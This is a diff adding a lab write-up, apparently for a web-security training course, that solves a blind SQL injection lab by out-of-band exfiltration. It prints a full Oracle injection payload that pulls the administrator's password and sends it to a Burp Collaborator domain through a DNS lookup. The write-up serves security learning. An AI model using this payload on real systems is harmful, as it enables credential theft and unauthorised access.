@@ -637,5 +637,28 @@ Blind SQLI : Where database doesn't show the error directly instead they will sh
 
 # ------------------------------------------------------------------------------
 
-# 16. Blind SQL injection with out-of-band data exfiltration
+# 16. Blind SQL injection with out-of-band data exfiltration. 
 
+<img width="743" height="286" alt="image" src="https://github.com/user-attachments/assets/e14f2cdc-6f0f-4dbe-9b38-d51b9c8d2d71" />
+
+### **Goal** : To Cause a DNS lookup burp collaborator and find the password of the administrator then login as the administrator user. 
+
+### **Ingrediants** : Same as above. 
+
+### **Solving** : 
+
+- Like the previous lab we will use the burp collaborator. This will be the url 1qss450y4g9d1jwezcmkyr1u1l7cv7jw.oastify.com. We can get the script from the cheat sheet.
+
+<img width="829" height="538" alt="image" src="https://github.com/user-attachments/assets/953486a9-2c17-448c-a56b-9a6441b5fe19" />
+
+- Hence this is the script ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT  password from users where username='administrator')||'.1qss450y4g9d1jwezcmkyr1u1l7cv7jw.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+
+<img width="1330" height="540" alt="image" src="https://github.com/user-attachments/assets/c7e1fd8d-ebb6-4f78-a1d7-0873d899d5e7" />
+
+ <img width="1018" height="497" alt="image" src="https://github.com/user-attachments/assets/f2342198-f0c0-4301-8ae4-b58cdf26f74c" />
+
+- Hence we have found the administrator password and we solved the lab.
+
+<img width="1215" height="596" alt="image" src="https://github.com/user-attachments/assets/8e5a6c71-698d-4d9b-8b4f-5e965e91f79d" />
+
+# ------------------------------------------------------------------------------
